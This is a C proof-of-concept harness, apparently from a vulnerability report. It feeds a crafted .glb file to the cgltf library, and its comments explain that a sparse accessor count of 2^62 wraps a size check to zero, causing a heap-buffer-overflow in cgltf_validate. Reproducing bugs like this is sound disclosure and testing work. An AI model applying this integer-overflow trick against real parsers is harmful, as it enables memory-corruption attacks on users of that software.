#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/stat.h>

#include "cgltf.h"

static cgltf_result stub_read(const struct cgltf_memory_options *m,
                               const struct cgltf_file_options  *f,
                               const char *p, cgltf_size *sz, void **d) {
    (void)m; (void)f; (void)p;
    *d = calloc(1, 1); *sz = 0;
    return cgltf_result_success;
}
static void stub_release(const struct cgltf_memory_options *m,
                          const struct cgltf_file_options  *f,
                          void *d, cgltf_size size) {
    (void)m; (void)f; (void)size;
    free(d);
}

int main(int argc, char **argv) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <poc.glb>\n", argv[0]); return 1; }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { perror(argv[1]); return 1; }
    struct stat st; fstat(fileno(fp), &st);
    size_t sz = (size_t)st.st_size;
    uint8_t *buf = malloc(sz);
    fread(buf, 1, sz, fp); fclose(fp);

    cgltf_options opts = {0};
    opts.file.read    = stub_read;
    opts.file.release = stub_release;

    cgltf_data *gltf = NULL;
    if (cgltf_parse(&opts, buf, sz, &gltf) != cgltf_result_success || !gltf) {
        fprintf(stderr, "parse failed\n"); free(buf); return 1;
    }

    cgltf_load_buffers(&opts, gltf, NULL);

    /* Crash occurs here: sparse.count=2^62, component_size=4
     * 4 * 2^62 = 2^64 ≡ 0 → size check passes → cgltf_calc_index_bound
     * reads past the 4-byte index buffer → heap-buffer-overflow */
    cgltf_validate(gltf);  /* ← crash inside here */

    cgltf_free(gltf);
    free(buf);
    fprintf(stderr, "no crash (unexpected)\n");
    return 0;
}
